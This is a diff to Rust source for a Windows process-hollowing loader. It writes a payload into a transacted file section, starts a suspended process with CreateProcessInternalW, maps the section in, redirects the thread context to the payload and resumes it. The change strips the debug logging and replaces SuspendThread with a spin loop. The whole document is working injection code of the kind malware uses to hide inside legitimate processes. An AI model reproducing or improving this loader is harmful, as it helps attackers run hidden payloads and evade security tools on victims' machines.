@@ -7,6 +7,7 @@ extern crate alloc;
 use alloc::vec;
 use alloc::vec::Vec;
 use core::ffi::c_void;
+use core::hint::spin_loop;
 use core::mem::zeroed;
 use core::ops::Deref;
 use core::ptr::{copy_nonoverlapping, null, null_mut};
@@ -19,7 +20,7 @@ use windows_sys::Win32::Storage::FileSystem::{CreateFileTransactedW, CreateFileW
 use windows_sys::Win32::System::Diagnostics::Debug::{GetThreadContext, SetThreadContext, WriteProcessMemory, CONTEXT, CONTEXT_ALL_AMD64, CONTEXT_ALL_X86, CONTEXT_INTEGER_AMD64, CONTEXT_INTEGER_X86, IMAGE_NT_HEADERS32, IMAGE_NT_HEADERS64, OBJECT_ATTRIB_FLAGS};
 use windows_sys::Win32::System::Memory::{CreateFileMappingW, MapViewOfFile, UnmapViewOfFile, VirtualAlloc, FILE_MAP_READ, MEM_COMMIT, MEM_RESERVE, PAGE_PROTECTION_FLAGS, PAGE_READONLY, PAGE_READWRITE, SECTION_ALL_ACCESS, SECTION_FLAGS, SEC_IMAGE};
 use windows_sys::Win32::System::SystemServices::IMAGE_DOS_HEADER;
-use windows_sys::Win32::System::Threading::{OpenThread, ResumeThread, SuspendThread, CREATE_NO_WINDOW, CREATE_SUSPENDED, DEBUG_PROCESS, DETACHED_PROCESS, PROCESS_INFORMATION, STARTUPINFOW, THREAD_GET_CONTEXT, THREAD_SUSPEND_RESUME};
+use windows_sys::Win32::System::Threading::{OpenThread, ResumeThread, SuspendThread, CREATE_NO_WINDOW, CREATE_SUSPENDED, DEBUG_PROCESS, DETACHED_PROCESS, HIGH_PRIORITY_CLASS, INHERIT_CALLER_PRIORITY, PROCESS_INFORMATION, STARTUPINFOW, THREAD_GET_CONTEXT, THREAD_SUSPEND_RESUME};
 
 
 type PVoid = *mut c_void;
@@ -215,6 +216,7 @@ where
     let mut pi: PROCESS_INFORMATION = unsafe { zeroed() };
 
     let token: HANDLE = null_mut();
+
     let mut new_token: HANDLE = null_mut();
     if unsafe {
         CreateProcessInternalW(
@@ -232,12 +234,10 @@ where
             &mut new_token as *mut _ as _,
         )
     } == FALSE {
-        let err = unsafe { GetLastError() };
-        log_debug!("Failed to create process. Error code: {}\n", err);
-        return None;
+        None
+    } else {
+        Some(pi)
     }
-
-    Some(pi)
 }
 
 pub fn map_buffer_into_process(pi: &PROCESS_INFORMATION, section: HANDLE) -> Option<PVoid> {
@@ -358,13 +358,12 @@ fn thread_context(pi: &PROCESS_INFORMATION) -> Option<CONTEXT> {
 
     let mut context: CONTEXT = unsafe { zeroed() };
     context.ContextFlags = CONTEXT_FLAGS;
-    
-    unsafe {
-        log_debug!("{}\n", SuspendThread(pi.hThread))
+
+    for _ in 0..20 {
+        spin_loop();
     }
     
     if unsafe { GetThreadContext(pi.hThread, &mut context as *mut _ as _) == FALSE } {
-        log_debug!("Last os error: {}\n", unsafe { GetLastError() });
         None
     } else {
         Some(context)
@@ -452,18 +451,18 @@ fn redirect_to_payload(loaded_pe: PByte, loaded_base: PVoid, pi: &PROCESS_INFORM
 pub fn hollow(target: &Path, payload: PByte, payload_size: usize) -> Option<PROCESS_INFORMATION> {
     let tmp = Path::temp_file("tmp");
     let _ = tmp.create_file();
-    
+
     let section = make_transacted_section(tmp.deref(), payload, payload_size).ok()?;
     
     let pi = create_new_process_internal(target.deref(), target.parent()?.deref())?;
-
+    
     let remote_base = map_buffer_into_process(&pi, section)?;
 
     if !redirect_to_payload(payload, remote_base, &pi) {
         None
     } else {
         unsafe {
-            log_debug!("r1: {}, r2: {}, r3: {}\n", ResumeThread(pi.hThread), ResumeThread(pi.hThread), ResumeThread(pi.hThread));
+            ResumeThread(pi.hThread)
         };
 
         Some(pi)
